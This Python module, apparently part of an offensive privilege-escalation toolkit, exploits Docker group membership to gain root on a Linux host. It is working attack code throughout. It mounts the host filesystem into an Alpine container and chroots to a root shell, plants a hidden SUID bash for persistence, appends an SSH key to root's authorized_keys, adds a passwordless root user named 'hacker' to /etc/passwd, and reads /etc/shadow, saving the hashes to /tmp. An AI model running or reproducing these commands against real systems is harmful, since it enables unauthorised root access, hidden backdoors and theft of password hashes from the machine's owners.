"""
Docker Group Exploitation
=========================

Exploit Docker group membership for instant root access.

How it works:
1. Docker group can create and manage containers
2. Mount host filesystem (/) into container
3. Chroot into mounted filesystem
4. Now operating as root on host
"""

import os
from typing import Optional, List

from .base import BaseGroupExploit
from ..core.groups import GroupFinding, ExploitResult, ExploitStatus


class DockerExploit(BaseGroupExploit):
    """
    Exploit Docker group membership.

    This is the most reliable privilege escalation vector.
    Success rate: ~98%
    """

    METHODS = [
        {
            'name': 'mount_host_filesystem',
            'description': 'Mount host / to /mnt in Alpine container, chroot to root shell',
            'command': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
            'interactive': True,
            'test_command': 'docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow'
        },
        {
            'name': 'privileged_container',
            'description': 'Run fully privileged container with all capabilities',
            'command': 'docker run --privileged --rm -it alpine sh',
            'interactive': True
        },
        {
            'name': 'suid_bash',
            'description': 'Create SUID bash copy for persistent access',
            'command': 'docker run -v /:/mnt --rm alpine sh -c "cp /mnt/bin/bash /mnt/tmp/.rootbash && chmod 4755 /mnt/tmp/.rootbash"',
            'interactive': False,
            'post_exploit': '/tmp/.rootbash -p'
        },
        {
            'name': 'add_ssh_key',
            'description': 'Add SSH key to root authorized_keys',
            'command': 'docker run -v /:/mnt --rm alpine sh -c "mkdir -p /mnt/root/.ssh && echo \'YOUR_KEY\' >> /mnt/root/.ssh/authorized_keys"',
            'interactive': False
        },
        {
            'name': 'read_shadow',
            'description': 'Read /etc/shadow for password hashes',
            'command': 'docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow',
            'interactive': False
        },
        {
            'name': 'add_root_user',
            'description': 'Add passwordless root user to /etc/passwd',
            'command': 'docker run -v /:/mnt --rm alpine sh -c "echo \'hacker::0:0::/root:/bin/bash\' >> /mnt/etc/passwd"',
            'interactive': False,
            'post_exploit': 'su - hacker'
        }
    ]

    def check_available(self) -> bool:
        """Check if Docker exploitation is possible"""
        # Check if docker binary exists
        if not self.check_binary_exists('docker'):
            self.log("Docker binary not found", "error")
            return False

        # Check if docker daemon is running
        returncode, stdout, stderr = self.run_command('docker ps', timeout=5)

        if returncode != 0:
            if 'permission denied' in stderr.lower():
                self.log("Docker available but permission denied", "error")
            elif 'cannot connect' in stderr.lower():
                self.log("Docker daemon not running", "error")
            else:
                self.log(f"Docker check failed: {stderr}", "error")
            return False

        self.log("Docker is available and accessible", "success")
        return True

    def get_methods(self) -> List[dict]:
        """Get available Docker exploitation methods"""
        return self.METHODS

    def exploit(
            self,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Execute Docker exploitation.

        Args:
            method: Specific method to use
            interactive: Allow interactive shell

        Returns:
            ExploitResult
        """
        self.log(f"Attempting Docker group exploitation...", "info")

        # Check availability
        if not self.check_available():
            return ExploitResult(
                finding=self.finding,
                method="N/A",
                status=ExploitStatus.ERROR,
                error="Docker not available"
            )

        # Select method
        if method:
            selected = next((m for m in self.METHODS if m['name'] == method), None)
            if not selected:
                return ExploitResult(
                    finding=self.finding,
                    method=method,
                    status=ExploitStatus.ERROR,
                    error=f"Unknown method: {method}"
                )
        else:
            # Default: use SUID bash for non-interactive, mount for interactive
            if interactive:
                selected = self.METHODS[0]  # mount_host_filesystem
            else:
                selected = self.METHODS[2]  # suid_bash

        self.log(f"Using method: {selected['name']}", "info")
        self.log(f"Command: {selected['command']}", "info")

        # Handle interactive methods
        if selected.get('interactive') and not interactive:
            self.log("Method requires interactive shell", "warning")
            self.print_methods()

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.MANUAL,
                output=f"Run manually: {selected['command']}"
            )

        # Execute exploitation
        if selected.get('interactive') and interactive:
            self.log("Launching interactive root shell...", "success")
            os.system(selected['command'])

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.SUCCESS,
                got_root=True
            )
        else:
            # Non-interactive exploitation
            returncode, stdout, stderr = self.run_command(selected['command'], timeout=60)

            if returncode == 0:
                self.log("Exploitation successful!", "success")

                artifacts = []

                # Check for created artifacts
                if 'suid_bash' in selected['name']:
                    artifacts.append('/tmp/.rootbash')
                    self.log("SUID bash created at /tmp/.rootbash", "success")
                    self.log("Run: /tmp/.rootbash -p", "info")

                if 'shadow' in selected['name']:
                    self.log("Shadow file contents:", "success")
                    print(stdout)

                    # Save to file
                    with open('/tmp/.shadow_dump', 'w') as f:
                        f.write(stdout)
                    artifacts.append('/tmp/.shadow_dump')

                return ExploitResult(
                    finding=self.finding,
                    method=selected['name'],
                    status=ExploitStatus.SUCCESS,
                    output=stdout,
                    got_root=True,
                    artifacts=artifacts
                )
            else:
                self.log(f"Exploitation failed: {stderr}", "error")

                return ExploitResult(
                    finding=self.finding,
                    method=selected['name'],
                    status=ExploitStatus.FAILED,
                    error=stderr
                )

    def quick_root(self) -> bool:
        """Quick method to get instant root shell"""
        if not self.check_available():
            return False

        self.log("Launching root shell via Docker...", "success")
        os.system('docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
        return True